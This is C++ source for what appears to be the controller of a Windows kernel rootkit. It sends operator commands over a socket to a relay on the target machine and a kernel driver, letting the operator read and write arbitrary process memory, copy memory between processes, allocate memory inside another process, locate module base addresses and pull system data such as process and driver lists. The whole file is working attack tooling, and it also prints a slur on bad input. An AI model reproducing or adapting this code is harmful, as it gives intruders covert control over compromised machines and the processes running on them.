#include "communication.h"


int ReqAct(NETWORK_INFO Sender, NETWORK_INFO Server) {
    PASS_DATA result;
    char ReqType = 0;
    int totallen = 0;
    char SenderIP[INET6_ADDRSTRLEN];
    char InputStr[1024];
    ROOTKIT_OPERATION RootStat = RKOP_NOOPERATION;
    ROOTKIT_OPERATION MedStat;
    BOOL Handled = FALSE;
    BOOL IsRootkit = FALSE;

    PVOID RndBuf = NULL;
    PVOID RndMsg = NULL;
    PVOID RetEchoBuf = NULL;
    PVOID TimeBuf = NULL;
    PVOID MeBuf = NULL;
    PVOID MeStr1 = NULL;
    PVOID MeStr2 = NULL;
    PVOID MeStr3 = NULL;
    PVOID EchoBuf = NULL;
    ULONG RndSize = 0;
    ULONG EchoSize = 0;
    ULONG RetEchoSize = 0;
    ULONG TimeSize = 0;
    ULONG MeSize = 0;
    ULONG length1;
    ULONG length2;
    ULONG length3;
    ADDRESS_FAMILY AddrType = NULL;
    char RndVal;
    USHORT PortNum;
    sockaddr_in MyInfo;

    ROOTKIT_MEMORY SystemInfo;
    ULONG WriteSize = 0;
    ULONG ReadSize = 0;
    ULONG AllocSize = 0;
    ULONG ZeroBits = 0;
    ULONG64 WriteAddr;
    ULONG64 WriteFromAddr;
    ULONG64 ReadAddr;
    ULONG64 AllocAddr;
    PVOID BaseAddr;
    PVOID ReadBuf;
    PVOID MdlName = NULL;
    PVOID SemiMdl = NULL;
    PVOID WriteBuf = NULL;
    PVOID DbgMsg = NULL;
    char ProcessorsNum = 8;
    char InfoTypes[100];
    char StringClnChr;
    ROOTKIT_UNEXERR Err = successful;

    while (1 == 1) {
        // Get user input for the performing operation of the rootkit -
        switch (ReturnInput("Choose NOW:\nr. random number (not random)\ne. echo\nt. time on medium\ni. information on tomed\nT. terminate\n\nChoose NOW ROOTKIT : \nw. Write into process memory\nR. Read from process memory\nD. Display debug string (NO SPACES)\nb. Get Module base address\nS. Get system information\nA. Allocate specific memory region in a specific process\n")) {
        case 'r': RootStat = random; break;

        case 'e': RootStat = echo; break;

        case 't': RootStat = timereq; break;

        case 'i': RootStat = medata; break;

        case 'T': RootStat = terminatereq; break;

        case 'w': RootStat = RKOP_WRITE; break;

        case 'R': RootStat = RKOP_READ; break;

        case 'D': RootStat = RKOP_DSPSTR; break;

        case 'b': RootStat = RKOP_MDLBASE; break;

        case 'S': RootStat = RKOP_SYSINFO; break;

        case 'A': RootStat = RKOP_PRCMALLOC; break;

        default:
            printf("Retard\n");
            printf("Quit?\n");
            std::cin >> ReqType;
            if (ReqType == 'y') {
                closesocket(Sender.AsoSock);
                return -1;
            }

            RootStat = RKOP_NOOPERATION;
            Handled = FALSE;
            break;
        }


        if (RootStat != RKOP_NOOPERATION) {
            // Confirm the status of the operation (RKOP/non-RKOP) -

            result = SendData(Sender.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
            if (!result.err && result.value == sizeof(RootStat)) {
                result = RecvData(Sender.AsoSock, sizeof(MedStat), &MedStat, FALSE, 0);
                if (!result.err && result.value == sizeof(MedStat)) {
                    if (MedStat == RKOP_TERMINATE) {
                        printf("Medium requested termination..\n");
                        result = SendData(Sender.AsoSock, &MedStat, sizeof(MedStat), FALSE, 0);
                        closesocket(Sender.AsoSock);
                        return -1;
                    }

                    if (MedStat != RootStat) {
                        printf("Did not return correct operation regular (expected %lu but got %lu instead)\n", RootStat, MedStat);
                        RootStat = RKOP_NOOPERATION;
                    }

                    if (!result.err && result.value == sizeof(RootStat)) {
                        Handled = FALSE;
                        switch (RootStat) {
                        case random:
                            // Receive random number value from medium -

                            result = RecvData(Sender.AsoSock, sizeof(RndSize), &RndSize, FALSE, 0);
                            if (result.err || result.value != sizeof(RndSize)) {
                                printf("Could not receive random message size\n");
                                break;
                            }

                            RndBuf = malloc(RndSize);
                            if (RndBuf == NULL) {
                                printf("Could not allocate memory for random message buffer\n");
                                break;
                            }

                            RndMsg = malloc(RndSize - 1);
                            if (RndMsg == NULL) {
                                printf("Could not allocate memory for random message\n");
                                free(RndBuf);
                                break;
                            }

                            result = RecvData(Sender.AsoSock, RndSize, RndBuf, FALSE, 0);
                            if (result.err || result.value != RndSize) {
                                printf("Could not receive random message\n");
                                free(RndBuf);
                                free(RndMsg);
                                break;
                            }

                            memcpy(RndMsg, RndBuf, RndSize - 1);
                            memcpy(&RndVal, (PVOID)((ULONG64)RndBuf + RndSize - 1), 1);
                            printf((char*)RndMsg);
                            printf("%hhu\n", RndVal);
                            free(RndBuf);
                            free(RndMsg);
                            break;

                        case echo:
                            // Send a specified string to the medium and receive it back -

                            printf("Write string to echo and check ->\n");
                            std::cin >> InputStr;
                            EchoSize = (ULONG)strlen(InputStr) + 1;

                            EchoBuf = malloc(EchoSize);
                            if (EchoBuf == NULL) {
                                printf("Cannot allocate memory for echo buffer\n");
                                break;
                            }

                            memcpy(EchoBuf, InputStr, EchoSize);
                            printf("Default of echo (strings):\n");
                            result = SendData(Sender.AsoSock, &EchoSize, sizeof(EchoSize), FALSE, 0);
                            if (result.err || result.value != sizeof(EchoSize)) {
                                printf("Cannot send echo buffer size\n");
                                free(EchoBuf);
                                break;
                            }

                            result = SendData(Sender.AsoSock, EchoBuf, EchoSize, FALSE, 0);
                            if (result.err || result.value != EchoSize) {
                                printf("Cannot send echo buffer\n");
                                free(EchoBuf);
                                break;
                            }

                            printf("Sent string: %s\n", (char*)EchoBuf);
                            result = RecvData(Sender.AsoSock, sizeof(RetEchoSize), &RetEchoSize, FALSE, 0);
                            if (result.err || result.value != sizeof(RetEchoSize)) {
                                printf("Cannot receive ret echo size\n");
                                free(EchoBuf);
                                break;
                            }

                            if (RetEchoSize != EchoSize) {
                                printf("Sizes of echo values are not equal (expected %lu but got %lu instead)\n", EchoSize, RetEchoSize);
                                free(EchoBuf);
                                break;
                            }

                            RetEchoBuf = malloc(EchoSize);
                            if (RetEchoBuf == NULL) {
                                printf("Cannot allocate memory for returned echo buffer\n");
                                free(EchoBuf);
                                break;
                            }

                            result = RecvData(Sender.AsoSock, EchoSize, RetEchoBuf, FALSE, 0);
                            if (result.err || result.value != EchoSize) {
                                printf("Cannot receive ret echo buffer\n");
                                free(RetEchoBuf);
                                free(EchoBuf);
                                break;
                            }

                            printf("Received string: %s\n", (char*)RetEchoBuf);
                            if (strcmp((char*)RetEchoBuf, (char*)EchoBuf) == 0) {
                                printf("Strings are the same\n");
                            }
                            else {
                                printf("Strings are not the same\n");
                            }

                            free(RetEchoBuf);
                            free(EchoBuf);
                            break;

                        case timereq:
                            // Get the time on the target machine -

                            result = RecvData(Sender.AsoSock, sizeof(TimeSize), &TimeSize, FALSE, 0);
                            if (result.err || result.value != sizeof(TimeSize)) {
                                printf("Cannot receive time size\n");
                                break;
                            }

                            TimeBuf = malloc(TimeSize);
                            if (TimeBuf == NULL) {
                                printf("Cannot allocate memory for time string\n");
                                break;
                            }

                            result = RecvData(Sender.AsoSock, TimeSize, TimeBuf, FALSE, 0);
                            if (result.err || result.value != TimeSize) {
                                printf("Cannot receive time size\n");
                                free(TimeBuf);
                                break;
                            }
                            printf("Current time on medium -\n%s", (char*)TimeBuf);
                            free(TimeBuf);
                            break;

                        case medata:
                            // Get network information about the client from the medium -

                            result = RecvData(Sender.AsoSock, sizeof(MeSize), &MeSize, FALSE, 0);
                            if (result.err || result.value != sizeof(MeSize)) {
                                printf("Cannot get me data size\n");
                                break;
                            }

                            MeBuf = malloc(MeSize);
                            if (MeBuf == NULL) {
                                printf("Cannot allocate memory for me data buffer\n");
                                break;
                            }

                            result = RecvData(Sender.AsoSock, MeSize, MeBuf, FALSE, 0);
                            if (result.err || result.value != MeSize) {
                                printf("Cannot get me data buffer\n");
                                break;
                            }

                            memcpy(&length1, MeBuf, sizeof(length1));
                            memcpy(&length2, (PVOID)((ULONG64)MeBuf + sizeof(length1) + length1), sizeof(length2));
                            memcpy(&length3, (PVOID)((ULONG64)MeBuf + sizeof(length1) + length1 + sizeof(length2) + length2), sizeof(length3));

                            MeStr1 = malloc(length1);
                            MeStr2 = malloc(length2);
                            MeStr3 = malloc(length3);
                            if (MeStr1 == NULL || MeStr2 == NULL || MeStr3 == NULL) {
                                printf("Cannot allocate at least one of the three message buffers\n");
                                if (MeStr1 == NULL) {
                                    free(MeStr1);
                                }

                                if (MeStr2 == NULL) {
                                    free(MeStr2);
                                }

                                if (MeStr3 == NULL) {
                                    free(MeStr3);
                                }
                                free(MeBuf);
                                break;
                            }

                            memcpy(MeStr1, (PVOID)((ULONG64)MeBuf + sizeof(length1)), length1);
                            memcpy(MeStr2, (PVOID)((ULONG64)MeBuf + sizeof(length1) + length1 + sizeof(length2)), length2);
                            memcpy(MeStr3, (PVOID)((ULONG64)MeBuf + sizeof(length1) + length1 + length2 + sizeof(length2) + sizeof(length3)), length3);
                            memcpy(&PortNum, (PVOID)((ULONG64)MeBuf + sizeof(length1) + length1 + length2 + sizeof(length2) + sizeof(length3) + length3), sizeof(PortNum));
                            memcpy(&MyInfo, (PVOID)((ULONG64)MeBuf + sizeof(length1) + length1 + length2 + sizeof(length2) + sizeof(length3) + length3 + sizeof(PortNum)), sizeof(MyInfo));


                            printf((char*)MeStr3);
                            free(MeStr3);

                            printf((char*)MeStr2);
                            free(MeStr2);
                            printf("Connecting to server from port: %hu\n", PortNum);


                            printf((char*)MeStr1);
                            free(MeStr1);

                            printf("Address family: ");
                            AddrType = NULL;
                            if (MyInfo.sin_family == AF_INET) {
                                printf("IPV4\n");
                                AddrType = AF_INET;
                            }
                            else if (MyInfo.sin_family == AF_INET6) {
                                printf("IPV6\n");
                                AddrType = AF_INET6;
                            }
                            else {
                                printf("Not Valid\n");
                            }

                            if (AddrType != NULL) {
                                inet_ntop(AddrType, &(Sender.AddrInfo.sin_addr), SenderIP, INET_ADDRSTRLEN);
                                printf("Value of received address (converted to char*): %s\n", SenderIP);
                            }

                            else {
                                printf("Because address type is not valid using default of ipv4 to parse IP\n");
                                inet_ntop(AF_INET, &(Sender.AddrInfo.sin_addr), SenderIP, INET_ADDRSTRLEN);
                                printf("Value of received address (converted to char*): %s\n", SenderIP);
                            }

                            printf("Port sending data from: %hu\n", MyInfo.sin_port);
                            break;

                        case terminatereq:
                            // Request to terminate the rootkits operations -

                            closesocket(Sender.AsoSock);
                            return -1;

                        default: IsRootkit = TRUE; break;  // Specifies that the operation is an RKOP operation
                        }



                        if (IsRootkit) {
                            // Get the main module string for the operation and send it to the medium -

                            IsRootkit = FALSE;
                            printf("Write main module name of operation (process name else mymyymym)->\n");
                            std::cin >> InputStr;

                            MdlName = malloc(strlen(InputStr) + 1);
                            if (MdlName == NULL) {
                                printf("Cannot allocate memory for module name string buffer\n");
                                RootStat = RKOP_NOOPERATION;
                            }
                            else {
                                memcpy(MdlName, InputStr, strlen(InputStr) + 1);
                                printf("Main request module - %s\n", (char*)MdlName);
                            }

                            switch (RootStat) {
                            case RKOP_WRITE:
                                // Write into process virtual memory (from user supplied buffer / another process) -

                                // Reset InputStr for second module usage -
                                for (int i = 0; i < strlen(InputStr) + 1; i++) {
                                    StringClnChr = InputStr[i];
                                    InputStr[i] = -52;  // placeholder for initialization of char[]
                                    if (StringClnChr == '\0') {
                                        break;
                                    }
                                }

                                printf("Write secondary module name of operation (process name, mymyymym for medium / regular for regular buffer passing, no systemspace)->\n");
                                std::cin >> InputStr;

                                SemiMdl = malloc(strlen(InputStr) + 1);
                                if (SemiMdl == NULL) {
                                    printf("Cannot allocate memory for secondary module name string buffer\n");
                                    Err = memalloc;
                                }
                                else {
                                    memcpy(SemiMdl, InputStr, strlen(InputStr) + 1);
                                    printf("Secondary request module - %s\n", (char*)SemiMdl);
                                }

                                printf("Write ZeroBits value for allocation for operation (value < 21)->\n");
                                std::cin >> ZeroBits;
                                if (ZeroBits >= 21 || ZeroBits < 0) {
                                    ZeroBits = 0;
                                }

                                if (strcmp(InputStr, "regular") == 0 && Err == successful) {
                                    printf("Write value to write into memory of target (string for now) ->\n");
                                    std::cin >> InputStr;
                                    WriteSize = (ULONG)strlen(InputStr) + 1;
                                    WriteBuf = malloc(WriteSize);
                                    if (WriteBuf == NULL) {
                                        printf("Cannot allocate memory for writing buffer\n");
                                        Err = memalloc;
                                    }
                                    else {
                                        memcpy(WriteBuf, InputStr, WriteSize);
                                    }
                                }

                                else {
                                    if (Err == successful) {
                                        printf("Write address to write from memory into target (ULONG64 value, no systemspace) ->\n");
                                        std::cin >> WriteFromAddr;
                                        WriteBuf = (PVOID)WriteFromAddr;
                                        printf("Write size of data to write from %s to %s (ULONG value) ->\n", (char*)SemiMdl, (char*)MdlName);
                                        std::cin >> WriteSize;
                                    }
                                }

                                if (Err == successful) {
                                    printf("Write address to write into in memory of target (ULONG64 value, no systemspace) ->\n");
                                    std::cin >> WriteAddr;
                                }

                                else {
                                    WriteAddr = NULL;
                                }

                                if (!WriteToRootkKMD((PVOID)WriteAddr, WriteBuf, WriteSize, (char*)MdlName, (char*)SemiMdl, Sender.AsoSock, Err, (ULONG_PTR)ZeroBits)) {
                                    printf("Write function did not succeed\n");
                                    if (WriteBuf != NULL && strcmp((char*)SemiMdl, "regular") == 0) {
                                        free(WriteBuf);
                                    }
                                    break;
                                }
                                else {
                                    printf("Write function succeeded\n");
                                    if (WriteBuf != NULL && strcmp(InputStr, "regular") == 0) {
                                        free(WriteBuf);
                                    }
                                    break;
                                }

                            case RKOP_READ:
                                // Read from process virtual memory -

                                printf("Write amount of bytes to read ->\n");
                                std::cin >> ReadSize;

                                ReadBuf = malloc(ReadSize);
                                if (ReadBuf == NULL) {
                                    printf("Cannot allocate memory for reading buffer\n");
                                    Err = memalloc;
                                }

                                if (Err == successful) {
                                    printf("Write the address to read from (ULONG64 value, no systemspace) ->\n");
                                    std::cin >> ReadAddr;
                                }
                                else {
                                    ReadAddr = NULL;
                                }

                                if (!ReadFromRootkKMD((PVOID)ReadAddr, ReadBuf, ReadSize, (char*)MdlName, Sender.AsoSock, Err)) {
                                    printf("Read function did not succeed\n");
                                    free(ReadBuf);
                                    break;
                                }

                                printf("Read function did succeed, printing values as string (char *) -> %s\n", (char*)ReadBuf);
                                free(ReadBuf);
                                break;

                            case RKOP_MDLBASE:
                                // Get the base address of a process module (executable) in memory -

                                printf("No extra buffer parameters for getting the module base..\n");
                                BaseAddr = GetModuleBaseRootkKMD((char*)MdlName, Sender.AsoSock);
                                if (BaseAddr == NULL) {
                                    printf("Module base operation failed\n");
                                    break;
                                }

                                printf("Module base operation succeeded -> %p\n", BaseAddr);
                                break;

                            case RKOP_DSPSTR:
                                // Display a debug string with DbgStringEx -

                                printf("Write debug string to display ->\n");
                                std::cin >> InputStr;
                                DbgMsg = malloc(strlen(InputStr) + 1);
                                if (DbgMsg == NULL) {
                                    printf("Cannot allocate memory for debug string buffer\n");
                                    Err = memalloc;
                                }
                                else {
                                    memcpy(DbgMsg, InputStr, strlen(InputStr) + 1);
                                }

                                if (!DisplayStringFromKMD((char*)DbgMsg, Sender.AsoSock, (char*)MdlName, Err)) {
                                    printf("Could not display debug string\n");
                                    free(DbgMsg);
                                    break;
                                }

                                printf("Displayed debug string %s\n", (char*)DbgMsg);
                                free(DbgMsg);
                                break;

                            case RKOP_SYSINFO:
                                // return specific information about the target system (with ZwQuerySystemInformation) -

                                printf("Write system info request types string (only from allowed characters):\n");
                                printf("r - Registry\nb - Basic\np - Performance\nt - TimeOfDay\nc - Processes (and threads)\nP - Processor Performance\ni - Interrupts (from all processors, array of 8)\n");
                                printf("e - Exceptions (of all processors, array of 8)\nm - System Modules (drivers)\nL - Lookaside\nI - Code Integrity\nC - System Policy\n");
                                std::cin >> InfoTypes;

                                if (!GetSystemInfoRootkKMD(InfoTypes, Sender.AsoSock, &SystemInfo, (char*)MdlName, &ProcessorsNum)) {
                                    printf("Get system information did not work\n");
                                    break;
                                }

                                printf("Get system information succeeded\n");
                                break;

                            case RKOP_PRCMALLOC:
                                // Allocate memory in a specific process (and leave it committed for now) -

                                printf("Write amount of bytes to allocate ->\n");
                                std::cin >> AllocSize;
                                printf("Write the address to allocate in memory (ULONG64 value, no systemspace) ->\n");
                                std::cin >> AllocAddr;
                                printf("Write ZeroBits value for allocation for operation (value < 21)->\n");
                                std::cin >> ZeroBits;
                                if (ZeroBits >= 21 || ZeroBits < 0) {
                                    ZeroBits = 0;
                                }

                                AllocAddr = (ULONG64)SpecAllocRootkKMD((PVOID)AllocAddr, AllocSize, (char*)MdlName, Sender.AsoSock, Err, (ULONG_PTR)ZeroBits);
                                if (AllocAddr == NULL) {
                                    printf("Allocation function did not succeed\n");
                                    break;
                                }

                                printf("Allocation function succeeded (%p)\n", (PVOID)AllocAddr);
                                break;
                            }
                        }

                        // Reset InputStr for later usage -
                        for (int i = 0; i < strlen(InputStr) + 1; i++) {
                            StringClnChr = InputStr[i];
                            InputStr[i] = -52;  // placeholder for initialization of char[]
                            if (StringClnChr == '\0') {
                                break;
                            }
                        }
                        ReqType = 0;
                        RootStat = RKOP_NOOPERATION;
                        Err = successful;
                    }
                }
            }
        }

        if (RootStat != RKOP_NOOPERATION && result.err) {
            printf("An error occurred\n");
            if (result.Term) {
                printf("Critical socket error occurred, quitting..\n");
                closesocket(Sender.AsoSock);
                return -1;
            }
        }

        // Clean important variables and network stack from last request -
        CleanNetStack(Sender.AsoSock);
        printf("FINISH MEDIUM FUNCTION FINISHED\n");
        printf("FINISH REQUESTER FUNCTION ITERATION COMPLETED\n");
    }
    closesocket(Sender.AsoSock);
    return 0;
}